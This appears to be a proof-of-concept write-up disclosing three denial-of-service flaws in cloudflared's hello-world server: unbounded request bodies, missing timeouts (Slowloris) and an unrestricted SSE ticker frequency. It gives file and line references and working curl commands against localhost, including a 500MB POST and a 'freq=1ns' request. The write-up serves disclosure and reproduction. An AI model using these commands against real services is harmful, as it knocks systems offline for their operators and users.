# DoS Vulnerability PoC — cloudflared Hello World Server

## Environment Setup

### 1. Build cloudflared

```bash
cd /path/to/cloudflared
go build -o cloudflared ./cmd/cloudflared
```

### 2. Start the vulnerable hello-world server

```bash
./cloudflared tunnel --hello-world --url localhost:8080
```

The server will be available at `http://localhost:8080`.

---

## Vulnerability A: Unbounded Request Body Consumption (OOM)

**File:** `hello/hello.go`, line 237
**Root cause:** `io.ReadAll(r.Body)` reads the entire body into memory with no size limit.

### Steps to Reproduce

```bash
# Generate a 2GB payload and send it to the server
# This will cause cloudflared to allocate ~2GB of memory
python3 poc/poc_oom.py http://localhost:8080
```

Or manually with curl:

```bash
# Send a 500MB body — watch cloudflared memory spike
dd if=/dev/zero bs=1M count=500 | curl -X POST --data-binary @- http://localhost:8080/
```

### Expected Result

- `cloudflared` memory usage spikes proportionally to the request body size.
- With a sufficiently large body (e.g., 2GB+), the process is killed by the OS OOM killer.
- Monitor with: `watch -n1 'ps -o pid,rss,vsz,comm -p $(pgrep cloudflared)'`

---

## Vulnerability B: No Server Timeouts (Slowloris)

**File:** `hello/hello.go`, line 120
**Root cause:** `http.Server{}` is created without `ReadTimeout`, `WriteTimeout`, or `ReadHeaderTimeout`, allowing connections to be held open indefinitely.

### Steps to Reproduce

```bash
# Launch 500 slow connections that each send 1 byte every 10 seconds
python3 poc/poc_slowloris.py http://localhost:8080
```

### Expected Result

- After enough slow connections, the server stops accepting new connections.
- Legitimate requests (e.g., `curl http://localhost:8080/`) hang or timeout.
- Monitor open connections: `ss -tn | grep :8080 | wc -l`

---

## Vulnerability C: Unrestricted SSE Frequency (CPU Exhaustion)

**File:** `hello/hello.go`, lines 201–206
**Root cause:** The `freq` query parameter is passed directly to `time.NewTicker()` with no minimum. Values like `1ns` cause a tight CPU loop.

### Steps to Reproduce

```bash
# Open multiple SSE connections with freq=1ns
python3 poc/poc_sse.py http://localhost:8080
```

Or manually with curl:

```bash
# Single connection — watch CPU spike to 100% on one core
curl -N "http://localhost:8080/sse?freq=1ns"
```

### Expected Result

- A single `curl -N "http://localhost:8080/sse?freq=1ns"` drives one CPU core to 100%.
- Multiple concurrent connections multiply the effect.
- Monitor with: `top -p $(pgrep cloudflared)`

---

## Combined Impact

An unauthenticated remote attacker can exploit these three vectors independently or together to:

1. **Exhaust memory** — single large POST request causes OOM
2. **Exhaust file descriptors** — hundreds of slow connections block all new connections
3. **Exhaust CPU** — nanosecond SSE frequency saturates CPU cores

This results in a **complete denial of service** of the cloudflared instance.
